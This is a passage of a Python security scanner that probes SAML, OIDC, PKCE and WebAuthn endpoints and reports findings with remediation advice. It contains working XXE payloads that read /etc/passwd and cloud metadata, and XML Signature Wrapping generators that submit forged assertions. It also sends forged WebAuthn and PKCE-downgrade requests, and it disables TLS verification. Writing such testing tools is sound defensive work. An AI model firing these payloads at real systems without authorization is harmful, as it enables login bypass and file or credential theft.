"""
saml_scanner.py — SAML / OIDC / PKCE / WebAuthn security scanner.

Tests:
  • XML Signature Wrapping (XSW 1-8) against discovered SAML ACS endpoints
  • SAML assertion replay (expired NotOnOrAfter)
  • SAML recipient mismatch (assertion Recipient != ACS URL)
  • OIDC implicit flow detection (response_type=token in crawled URLs)
  • PKCE challenge method downgrade (S256 → plain)
  • PKCE absent (no code_challenge on public-client authorize requests)
  • WebAuthn/FIDO2 endpoint discovery
  • WebAuthn password fallback detection (downgrade risk)
  • WebAuthn origin/rpId mismatch (forged clientDataJSON)
  • WebAuthn userVerification=preferred weakness

No lxml dependency — uses stdlib only.
"""
from __future__ import annotations

import base64
import itertools
import json
import logging
import re
import time
import uuid
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests

log = logging.getLogger(__name__)

# ── Well-known SAML ACS / SSO paths ──────────────────────────────────────────
_ACS_PATHS = [
    "/saml/acs",
    "/saml2/acs",
    "/saml/consume",
    "/auth/saml/callback",
    "/auth/saml2/callback",
    "/sso/saml",
    "/sso/acs",
    "/Saml2/Acs",
    "/simplesaml/module.php/saml/sp/saml2-acs.php/default-sp",
    "/api/auth/saml/callback",
    "/accounts/saml/acs",
    "/login/callback",
]

# ── Known WebAuthn / FIDO2 API paths ─────────────────────────────────────────
_WEBAUTHN_PATHS = [
    "/webauthn/register/begin",
    "/webauthn/register/complete",
    "/webauthn/login/begin",
    "/webauthn/login/complete",
    "/webauthn/authenticate",
    "/api/webauthn/login",
    "/api/webauthn/register",
    "/api/auth/webauthn",
    "/api/passkey/login",
    "/api/passkey/register",
    "/.well-known/webauthn",
]

# ── Regex for sitemap-crawl WebAuthn path detection ──────────────────────────
_WEBAUTHN_CRAWL_RE = re.compile(
    r"/(webauthn|passkey|fido2?|authenticator|credential)(/|$)", re.I
)

# ── Known OAuth authorize path fragments ─────────────────────────────────────
_OAUTH_AUTHORIZE_HINTS = [
    "/oauth/authorize",
    "/oauth2/authorize",
    "/connect/authorize",
    "/auth/oauth/authorize",
    "/openid-connect/auth",
    "/protocol/openid-connect/auth",
]

_OAUTH_AUTHORIZE_RE = re.compile(
    "|".join(re.escape(h) for h in _OAUTH_AUTHORIZE_HINTS), re.I
)

# ── XSW XML templates ────────────────────────────────────────────────────────
# Each is a minimal SAML Response with a valid-signed Assertion wrapped next
# to a forged one. The server should fail; if it succeeds = CRITICAL.

def _b64enc(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


# ── SAML XXE payload templates ────────────────────────────────────────────────

_XXE_FILE_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
               xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
               ID="xxe_file_{nonce}" Version="2.0"
               IssueInstant="2026-01-01T00:00:00Z" Destination="{acs}">
  <saml:Issuer>https://evil.dast.local</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion Version="2.0" ID="a{nonce}" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Issuer>https://evil.dast.local</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">&xxe;</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-12-31T23:59:59Z" Recipient="{acs}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z"/>
    <saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>"""

_XXE_SSRF_TEMPLATE = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
               xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
               ID="xxe_ssrf_{nonce}" Version="2.0"
               IssueInstant="2026-01-01T00:00:00Z" Destination="{acs}">
  <saml:Issuer>https://evil.dast.local</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion Version="2.0" ID="b{nonce}" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Issuer>https://evil.dast.local</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">&xxe;</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData NotOnOrAfter="2099-12-31T23:59:59Z" Recipient="{acs}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z"/>
    <saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>"""

_XXE_FILE_INDICATORS = [
    "root:", "/bin/bash", "/bin/sh", "/usr/bin", "daemon:", "nobody:",
    "www-data:", "nologin", "/etc/hostname",
]
_XXE_SSRF_INDICATORS = [
    "ami-id", "instance-id", "169.254.169.254", "metadata", "iam/",
    "placement/", "local-hostname",
]



def _xsw_payload(variant: int, target_url: str, attacker_email: str) -> str:
    """
    Build one of the 8 standard XSW SAML payload variants.
    All use a forged Assertion for attacker_email alongside a stub of a
    'valid' (empty signature) assertion. The goal is to detect servers
    that process the forged assertion when signature wrapping tricks them.
    """
    ts = "2020-01-01T00:00:00Z"  # deliberately expired
    recipient = target_url
    forged_id = f"_forged{uuid.uuid4().hex}"
    legit_id  = f"_legit{uuid.uuid4().hex}"

    forged_assertion = f"""
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        ID="{forged_id}" Version="2.0" IssueInstant="{ts}">
      <saml:Issuer>https://attacker.evil.com/idp</saml:Issuer>
      <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{attacker_email}</saml:NameID>
        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
          <saml:SubjectConfirmationData NotOnOrAfter="2099-12-31T00:00:00Z" Recipient="{recipient}"/>
        </saml:SubjectConfirmation>
      </saml:Subject>
      <saml:AuthnStatement AuthnInstant="{ts}">
        <saml:AuthnContext>
          <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
        </saml:AuthnContext>
      </saml:AuthnStatement>
    </saml:Assertion>"""

    legit_stub = f"""
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        ID="{legit_id}" Version="2.0" IssueInstant="{ts}">
      <saml:Issuer>https://legit-idp.example.com</saml:Issuer>
      <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
        <ds:SignedInfo>
          <ds:Reference URI="#{legit_id}"/>
        </ds:SignedInfo>
        <ds:SignatureValue>AAAA</ds:SignatureValue>
      </ds:Signature>
    </saml:Assertion>"""

    response_id = f"_resp{uuid.uuid4().hex}"

    if variant == 1:
        # XSW1: forged assertion is sibling of signed Response
        return f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="{response_id}" Version="2.0" IssueInstant="{ts}">
  <saml:Issuer>https://legit-idp.example.com</saml:Issuer>
  {forged_assertion}
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo><ds:Reference URI="#{response_id}"/></ds:SignedInfo>
    <ds:SignatureValue>AAAA</ds:SignatureValue>
  </ds:Signature>
</samlp:Response>"""

    elif variant == 2:
        # XSW2: forged in Extensions, legit inside Response
        return f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="{response_id}" Version="2.0" IssueInstant="{ts}">
  <samlp:Extensions>{forged_assertion}</samlp:Extensions>
  {legit_stub}
</samlp:Response>"""

    elif variant == 3:
        # XSW3: forged before signed assertion at same level
        return f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="{response_id}" Version="2.0" IssueInstant="{ts}">
  {forged_assertion}
  {legit_stub}
</samlp:Response>"""

    elif variant == 4:
        # XSW4: forged nested inside signed assertion's Advice
        legit_with_advice = legit_stub.replace(
            "</saml:Assertion>",
            f"<saml:Advice>{forged_assertion}</saml:Advice></saml:Assertion>",
        )
        return f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="{response_id}" Version="2.0" IssueInstant="{ts}">
  {legit_with_advice}
</samlp:Response>"""

    elif variant == 5:
        # XSW5: forged replaces entire Response, legit in Signature Object
        return f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="{response_id}" Version="2.0" IssueInstant="{ts}">
  <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:Object>{legit_stub}</ds:Object>
  </ds:Signature>
  {forged_assertion}
</samlp:Response>"""

    elif variant == 6:
        # XSW6: two Responses, forged ID matches Signature reference
        return f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="{response_id}" Version="2.0" IssueInstant="{ts}">
  {forged_assertion}
</samlp:Response>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="_outer{uuid.uuid4().hex}" Version="2.0" IssueInstant="{ts}">
  {legit_stub}
</samlp:Response>"""

    elif variant == 7:
        # XSW7: forged wrapped in ds:Object inside legit assertion's signature
        return f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="{response_id}" Version="2.0" IssueInstant="{ts}">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
      ID="{legit_id}" Version="2.0" IssueInstant="{ts}">
    <saml:Issuer>https://legit-idp.example.com</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo><ds:Reference URI="#{legit_id}"/></ds:SignedInfo>
      <ds:SignatureValue>AAAA</ds:SignatureValue>
      <ds:Object>{forged_assertion}</ds:Object>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>"""

    else:  # variant == 8
        # XSW8: forged at root level alongside wrapped Response
        return f"""<root>
  {forged_assertion}
  <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
      ID="{response_id}" Version="2.0" IssueInstant="{ts}">
    {legit_stub}
  </samlp:Response>
</root>"""


def _expired_assertion(target_url: str) -> str:
    """Minimal SAML response with NotOnOrAfter in the past (replay test)."""
    aid = f"_replay{uuid.uuid4().hex}"
    return f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_r{uuid.uuid4().hex}" Version="2.0" IssueInstant="2020-01-01T00:00:00Z">
  <saml:Assertion ID="{aid}" Version="2.0" IssueInstant="2020-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>admin@target.local</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData
            NotOnOrAfter="2020-01-01T00:00:01Z"
            Recipient="{target_url}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""


class SAMLScanner:
    """
    SAML / OIDC / PKCE security scanner.

    Usage:
        scanner = SAMLScanner(target="https://app.example.com", session=sess)
        findings = scanner.scan(sitemap_pages=sitemap.pages)
    """

    def __init__(
        self,
        target:     str,
        session:    requests.Session | None = None,
        stop_event: Any = None,
        timeout:    int = 10,
        rate_limit: float = 0.1,
        known_acs_urls:            list[str] | None = None,
        known_webauthn_endpoints:  list[tuple[str, str]] | None = None,
        saml_idp_url:              str | None = None,
    ):
        self.target                    = target.rstrip("/")
        self.session                   = session or self._default_session()
        self.stop_event                = stop_event
        self.timeout                   = timeout
        self.rate_limit                = rate_limit
        self.known_acs_urls            = list(known_acs_urls) if known_acs_urls else []
        self.known_webauthn_endpoints  = list(known_webauthn_endpoints) if known_webauthn_endpoints else []
        self.saml_idp_url              = saml_idp_url
        self._origin                   = self.target
        parsed                         = urlparse(self.target)
        self._base                     = f"{parsed.scheme}://{parsed.netloc}"

    @staticmethod
    def _default_session() -> requests.Session:
        import urllib3
        urllib3.disable_warnings()
        s = requests.Session()
        s.verify = False
        s.headers["User-Agent"] = "Mozilla/5.0 (DAST-SAMLScanner/1.0)"
        return s

    def _stopped(self) -> bool:
        return self.stop_event is not None and self.stop_event.is_set()

    def _finding(self, url: str, vuln_type: str, finding: str,
                 severity: str, proof: str = "", payload: str = "") -> dict:
        return {
            "id":         f"saml_{uuid.uuid4().hex[:10]}",
            "url":        url,
            "method":     "POST",
            "param":      "SAMLResponse",
            "param_type": "form",
            "vuln_type":  vuln_type,
            "finding":    finding,
            "severity":   severity,
            "proof":      proof[:500],
            "payload":    payload[:300],
            "category":   "Authentication",
            "agent":      "SAML Scanner",
            "cwe":        "CWE-287",
            "remediation": "Validate XML signatures strictly; reject assertions not destined for this SP; enforce NotOnOrAfter.",
        }

    # ── ACS endpoint discovery ────────────────────────────────────────────────

    def _probe_paths(self, paths: list[str]) -> list[str]:
        """GET each path; return URLs where response status is not 404 or 410."""
        alive = []
        for path in paths:
            if self._stopped():
                break
            url = self._base + path
            try:
                time.sleep(self.rate_limit)
                r = self.session.get(url, timeout=self.timeout,
                                     allow_redirects=False, verify=False)
                if r.status_code not in (404, 410):
                    alive.append(url)
                    log.debug("[SAMLScanner] alive: %s (%d)", url, r.status_code)
            except Exception:
                pass
        return alive

    def _discover_acs(self) -> list[str]:
        """Probe well-known SAML ACS paths; return alive ones, merged with known overrides."""
        discovered = self._probe_paths(_ACS_PATHS)
        known_set = set(self.known_acs_urls)
        return self.known_acs_urls + [u for u in discovered if u not in known_set]

    # ── XSW attack ───────────────────────────────────────────────────────────

    def _test_xsw(self, acs_url: str) -> list[dict]:
        """Send XSW 1-8 payloads to ACS endpoint; flag unexpected success."""
        findings = []
        attacker_email = f"attacker-{uuid.uuid4().hex[:6]}@evil.dast.local"

        for variant in range(1, 9):
            if self._stopped():
                break
            try:
                xml = _xsw_payload(variant, acs_url, attacker_email)
                encoded = _b64enc(xml)
                time.sleep(self.rate_limit)
                r = self.session.post(
                    acs_url,
                    data={"SAMLResponse": encoded, "RelayState": "/"},
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False,
                )
                body_lower = r.text.lower()

                # Success indicators: session cookie set, redirected to app,
                # or body contains auth success phrases without XML error phrases
                xml_error = any(t in body_lower for t in (
                    "invalid signature", "signature validation", "signaturevalidation",
                    "invalid saml", "saml error", "authentication failed",
                    "invalid assertion", "verification failed",
                ))
                auth_success = (
                    (r.status_code in (200, 302, 303) and not xml_error)
                    or any(t in body_lower for t in ("welcome", "dashboard", "logged in", "sign out", "logout"))
                    or any(
                        c for c in r.cookies
                        if any(h in c.lower() for h in ("session", "auth", "token", "sid"))
                    )
                )
                if auth_success:
                    findings.append(self._finding(
                        url=acs_url,
                        vuln_type="saml_xsw",
                        finding=(
                            f"XML Signature Wrapping XSW-{variant} — forged assertion accepted. "
                            f"Server did not reject unsigned/wrapped assertion for {attacker_email}"
                        ),
                        severity="Critical",
                        proof=f"HTTP {r.status_code} | cookies={list(r.cookies.keys())} | body[:200]={r.text[:200]}",
                        payload=f"XSW-{variant}: {xml[:200]}",
                    ))
                    log.warning("[SAMLScanner] XSW-%d succeeded at %s", variant, acs_url)

            except Exception as e:
                log.debug("[SAMLScanner] XSW-%d error at %s: %s", variant, acs_url, e)

        return findings

    # ── Assertion replay ──────────────────────────────────────────────────────

    def _test_replay(self, acs_url: str) -> list[dict]:
        """Send an assertion with NotOnOrAfter in the past; flag if accepted."""
        findings = []
        try:
            xml = _expired_assertion(acs_url)
            time.sleep(self.rate_limit)
            r = self.session.post(
                acs_url,
                data={"SAMLResponse": _b64enc(xml), "RelayState": "/"},
                timeout=self.timeout,
                allow_redirects=True,
                verify=False,
            )
            body_lower = r.text.lower()
            replay_rejected = any(t in body_lower for t in (
                "expired", "notonorafter", "not on or after", "assertion has expired",
                "token expired", "invalid notbefore",
            ))
            if not replay_rejected and r.status_code in (200, 302, 303):
                findings.append(self._finding(
                    url=acs_url,
                    vuln_type="saml_assertion_replay",
                    finding=(
                        "SAML assertion replay — expired assertion (NotOnOrAfter=2020) "
                        "was not rejected. Server may not validate assertion lifetime."
                    ),
                    severity="High",
                    proof=f"HTTP {r.status_code} | no expiry error in body",
                    payload="Expired NotOnOrAfter=2020-01-01T00:00:01Z",
                ))
        except Exception as e:
            log.debug("[SAMLScanner] Replay test error at %s: %s", acs_url, e)
        return findings

    # ── SAML recipient mismatch ───────────────────────────────────────────────

    def _test_recipient_mismatch(self, acs_url: str) -> list[dict]:
        """Send assertion whose Recipient points to a different URL; flag if accepted."""
        wrong_recipient = "https://attacker.evil.dast.local/saml/callback"
        aid = f"_rec{uuid.uuid4().hex}"
        xml = f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_r{uuid.uuid4().hex}" Version="2.0" IssueInstant="2020-01-01T00:00:00Z">
  <saml:Assertion ID="{aid}" Version="2.0" IssueInstant="2020-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID>admin@target.local</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData
            NotOnOrAfter="2099-12-31T00:00:00Z"
            Recipient="{wrong_recipient}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>"""
        try:
            time.sleep(self.rate_limit)
            r = self.session.post(
                acs_url,
                data={"SAMLResponse": _b64enc(xml), "RelayState": "/"},
                timeout=self.timeout,
                allow_redirects=True,
                verify=False,
            )
            body_lower = r.text.lower()
            mismatch_rejected = any(t in body_lower for t in (
                "invalid recipient", "recipient mismatch", "destination mismatch",
                "invalid destination", "audience restriction",
            ))
            auth_success = (
                r.status_code in (200, 302, 303)
                and not mismatch_rejected
                and any(t in body_lower for t in (
                    "welcome", "dashboard", "logged in", "sign out", "logout",
                )) or (
                    r.status_code == 302
                    and not mismatch_rejected
                    and any(
                        c for c in r.cookies
                        if any(h in c.lower() for h in ("session", "auth", "token", "sid"))
                    )
                )
            )
            if auth_success:
                return [self._finding(
                    url=acs_url,
                    vuln_type="saml_recipient_mismatch",
                    finding=(
                        f"SAML recipient mismatch — assertion with Recipient='{wrong_recipient}' "
                        "accepted at the real ACS URL. Server does not validate SubjectConfirmationData.Recipient."
                    ),
                    severity="High",
                    proof=f"HTTP {r.status_code} | cookies={list(r.cookies.keys())} | body[:200]={r.text[:200]}",
                    payload=f"Recipient={wrong_recipient}",
                )]
        except Exception as e:
            log.debug("[SAMLScanner] Recipient mismatch error at %s: %s", acs_url, e)
        return []

    # ── OIDC implicit flow detection ──────────────────────────────────────────

    def _detect_oidc_implicit(self, sitemap_pages: dict) -> list[dict]:
        """
        Scan crawled URLs for OIDC implicit flow patterns (response_type=token).
        Implicit flow is deprecated (RFC 9700); tokens in URL fragment = leaks.
        """
        findings = []
        implicit_re = re.compile(r"response_type=(?:token|id_token|token%20id_token)", re.I)

        for url in sitemap_pages:
            if self._stopped():
                break
            if implicit_re.search(url):
                findings.append({
                    **self._finding(
                        url=url,
                        vuln_type="oidc_implicit_flow",
                        finding=(
                            "OIDC implicit flow detected — response_type=token in OAuth authorize URL. "
                            "Implicit flow is deprecated (RFC 9700); access tokens appear in URL fragment "
                            "and are exposed to browser history, referrer headers, and JS."
                        ),
                        severity="Medium",
                        proof=f"URL: {url}",
                        payload="response_type=token",
                    ),
                    "method": "GET",
                    "param":  "response_type",
                    "cwe":    "CWE-319",
                    "remediation": "Use authorization code flow with PKCE (RFC 7636). Never use implicit flow.",
                })
                log.info("[SAMLScanner] OIDC implicit flow at %s", url)

        return findings

    # ── PKCE helpers ──────────────────────────────────────────────────────────

    def _iter_oauth_candidates(self, sitemap_pages: dict, limit: int):
        """Yield candidate URLs matching OAuth authorize paths from sitemap pages + their links."""
        for page_url in itertools.islice(sitemap_pages, limit):
            if self._stopped():
                return
            links = sitemap_pages.get(page_url, {}).get("links", [])
            for url in [page_url] + (list(links) if isinstance(links, (list, set)) else []):
                if isinstance(url, str) and _OAUTH_AUTHORIZE_RE.search(url):
                    yield url

    # ── PKCE downgrade ────────────────────────────────────────────────────────

    def _test_pkce_downgrade(self, sitemap_pages: dict) -> list[dict]:
        """
        Find OAuth authorize endpoints and retry with code_challenge_method=plain.
        If server accepts 'plain' when S256 is the intended method = downgrade vulnerability.
        """
        findings = []
        checked: set[str] = set()

        for candidate_url in self._iter_oauth_candidates(sitemap_pages, 30):
            parsed = urlparse(candidate_url)
            qs = parse_qs(parsed.query)

            if qs.get("code_challenge_method", [""])[0].upper() != "S256":
                continue
            if candidate_url in checked:
                continue
            checked.add(candidate_url)

            new_qs = {k: v[0] for k, v in qs.items()}
            new_qs["code_challenge_method"] = "plain"
            downgrade_url = urlunparse(parsed._replace(query=urlencode(new_qs)))

            try:
                time.sleep(self.rate_limit)
                r = self.session.get(
                    downgrade_url, timeout=self.timeout,
                    allow_redirects=False, verify=False,
                )
                body_lower = r.text.lower()
                plain_rejected = any(t in body_lower for t in (
                    "unsupported", "invalid method", "s256 required",
                    "plain not allowed", "method not supported",
                ))
                if not plain_rejected and r.status_code in (200, 302, 303):
                    findings.append({
                        **self._finding(
                            url=downgrade_url,
                            vuln_type="pkce_downgrade",
                            finding=(
                                "PKCE challenge method downgrade — server accepted "
                                "code_challenge_method=plain when S256 was expected. "
                                "Attackers can intercept authorization codes."
                            ),
                            severity="High",
                            proof=f"HTTP {r.status_code} with plain method, no error in body",
                            payload="code_challenge_method=plain",
                        ),
                        "method": "GET",
                        "param":  "code_challenge_method",
                        "cwe":    "CWE-326",
                        "remediation": "Enforce S256 exclusively. Reject plain method at the authorization server.",
                    })
                    log.info("[SAMLScanner] PKCE downgrade accepted at %s", downgrade_url)
            except Exception as e:
                log.debug("[SAMLScanner] PKCE downgrade error: %s", e)

        return findings

    # ── PKCE absent (no code_challenge at all) ────────────────────────────────

    def _test_pkce_absent(self, sitemap_pages: dict) -> list[dict]:
        """
        Find OAuth authorize URLs in sitemap and re-request them without any
        code_challenge. If server proceeds (200/302/303) without enforcing PKCE,
        public clients can be compromised via authorization code interception.
        """
        findings = []
        checked: set[str] = set()

        for candidate_url in self._iter_oauth_candidates(sitemap_pages, 50):
            parsed = urlparse(candidate_url)
            base_key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if base_key in checked:
                continue
            checked.add(base_key)

            qs = parse_qs(parsed.query)
            if not qs.get("response_type"):
                continue
            new_qs = {k: v[0] for k, v in qs.items()
                      if k not in ("code_challenge", "code_challenge_method")}
            no_pkce_url = urlunparse(parsed._replace(query=urlencode(new_qs)))

            try:
                time.sleep(self.rate_limit)
                r = self.session.get(
                    no_pkce_url, timeout=self.timeout,
                    allow_redirects=False, verify=False,
                )
                body_lower = r.text.lower()
                pkce_enforced = any(t in body_lower for t in (
                    "code_challenge required", "pkce required",
                    "code_challenge_method required", "missing code_challenge",
                ))
                if not pkce_enforced and r.status_code in (200, 302, 303):
                    findings.append({
                        **self._finding(
                            url=no_pkce_url,
                            vuln_type="pkce_absent",
                            finding=(
                                "PKCE not enforced — authorization request accepted without "
                                "code_challenge. Public clients are vulnerable to authorization "
                                "code interception (RFC 7636 / OAuth 2.1 requirement)."
                            ),
                            severity="High",
                            proof=f"HTTP {r.status_code} without code_challenge, no enforcement error",
                            payload="Removed code_challenge and code_challenge_method",
                        ),
                        "method": "GET",
                        "param": "code_challenge",
                        "cwe": "CWE-306",
                        "remediation": (
                            "Enforce PKCE (RFC 7636) for all public clients. "
                            "Reject authorization requests without code_challenge."
                        ),
                    })
                    log.info("[SAMLScanner] PKCE absent accepted at %s", no_pkce_url)
            except Exception as e:
                log.debug("[SAMLScanner] PKCE absent error: %s", e)

        return findings

    # ── WebAuthn / FIDO2 ──────────────────────────────────────────────────────

    def _discover_webauthn(
        self, sitemap_pages: dict | None = None
    ) -> list[tuple[str, str]]:
        """Probe known WebAuthn paths + sitemap-crawled candidates. Returns (url, kind) tuples."""
        # Collect all candidate paths before probing so we issue one probe round, not two
        candidate_paths: set[str] = set(_WEBAUTHN_PATHS)
        if sitemap_pages:
            for page_url, page_info in itertools.islice(sitemap_pages.items(), 500):
                parsed_page = urlparse(page_url)
                if _WEBAUTHN_CRAWL_RE.search(parsed_page.path):
                    candidate_paths.add(parsed_page.path)
                links = page_info.get("links", []) if isinstance(page_info, dict) else []
                for link in (links if isinstance(links, (list, set)) else []):
                    if not isinstance(link, str):
                        continue
                    parsed_link = urlparse(link)
                    if _WEBAUTHN_CRAWL_RE.search(parsed_link.path):
                        candidate_paths.add(parsed_link.path)

        probed_urls = self._probe_paths(list(candidate_paths))

        # Merge: known overrides first, then probed; deduplicate by URL
        all_entries: list[tuple[str, str]] = list(self.known_webauthn_endpoints)
        seen_urls: set[str] = {url for url, _ in self.known_webauthn_endpoints}
        for url in probed_urls:
            if url not in seen_urls:
                seen_urls.add(url)
                all_entries.append((url, "register" if "register" in url else "login"))
        return all_entries

    def _test_webauthn_password_fallback(
        self, webauthn_endpoints: list[tuple[str, str]]
    ) -> list[dict]:
        """Check if target exposes both WebAuthn and a password form — downgrade risk."""
        if not webauthn_endpoints:
            return []
        try:
            time.sleep(self.rate_limit)
            r = self.session.get(self.target, timeout=self.timeout,
                                 allow_redirects=True, verify=False)
            has_password = bool(re.search(r'<input[^>]+type=["\']password["\']', r.text, re.I))
            if has_password:
                return [{
                    **self._finding(
                        url=self.target,
                        vuln_type="webauthn_password_fallback",
                        finding=(
                            "WebAuthn/FIDO2 endpoint detected alongside a password login form. "
                            "Password fallback enables credential-based downgrade attacks, "
                            "negating the phishing-resistance guarantee of FIDO2."
                        ),
                        severity="Medium",
                        proof=f"WebAuthn: {webauthn_endpoints[0][0]} | password input at {self.target}",
                        payload="Detected: <input type=password> + WebAuthn endpoint",
                    ),
                    "method": "GET",
                    "param": "password",
                    "cwe": "CWE-308",
                    "remediation": (
                        "Require WebAuthn as the sole first factor; "
                        "protect or remove the password fallback path."
                    ),
                }]
        except Exception as e:
            log.debug("[SAMLScanner] WebAuthn fallback check error: %s", e)
        return []

    def _test_webauthn_origin_mismatch(
        self, webauthn_endpoints: list[tuple[str, str]]
    ) -> list[dict]:
        """POST a forged authenticatorAssertionResponse with wrong origin to login endpoints."""
        findings = []
        wrong_origin = "https://evil.attacker.local"
        client_data = json.dumps({
            "type": "webauthn.get",
            "challenge": "AAAAAAAAAAAAAAAAAAAAAA",
            "origin": wrong_origin,
            "crossOrigin": False,
        })
        client_data_b64 = base64.urlsafe_b64encode(
            client_data.encode()
        ).decode().rstrip("=")
        fake_payload = {
            "id": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            "rawId": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            "type": "public-key",
            "response": {
                "clientDataJSON": client_data_b64,
                "authenticatorData": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
                "signature": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
            },
        }

        login_endpoints = [u for u, k in webauthn_endpoints if k == "login"]
        for endpoint in login_endpoints[:2]:
            if self._stopped():
                break
            try:
                time.sleep(self.rate_limit)
                r = self.session.post(
                    endpoint,
                    json=fake_payload,
                    timeout=self.timeout,
                    allow_redirects=True,
                    verify=False,
                )
                body_lower = r.text.lower()
                origin_rejected = any(t in body_lower for t in (
                    "invalid origin", "origin mismatch", "rpid mismatch", "rp id mismatch",
                    "invalid client data", "bad origin", "forbidden origin",
                ))
                if not origin_rejected and r.status_code not in (400, 401, 403, 404, 422, 500):
                    findings.append({
                        **self._finding(
                            url=endpoint,
                            vuln_type="webauthn_origin_mismatch",
                            finding=(
                                f"WebAuthn origin not validated — server accepted "
                                f"assertion with clientDataJSON.origin='{wrong_origin}'. "
                                "Attackers can forge credentials from a cross-origin context."
                            ),
                            severity="Critical",
                            proof=f"HTTP {r.status_code} | no origin rejection in body",
                            payload=f"clientDataJSON.origin={wrong_origin}",
                        ),
                        "param": "clientDataJSON",
                        "cwe": "CWE-346",
                        "remediation": (
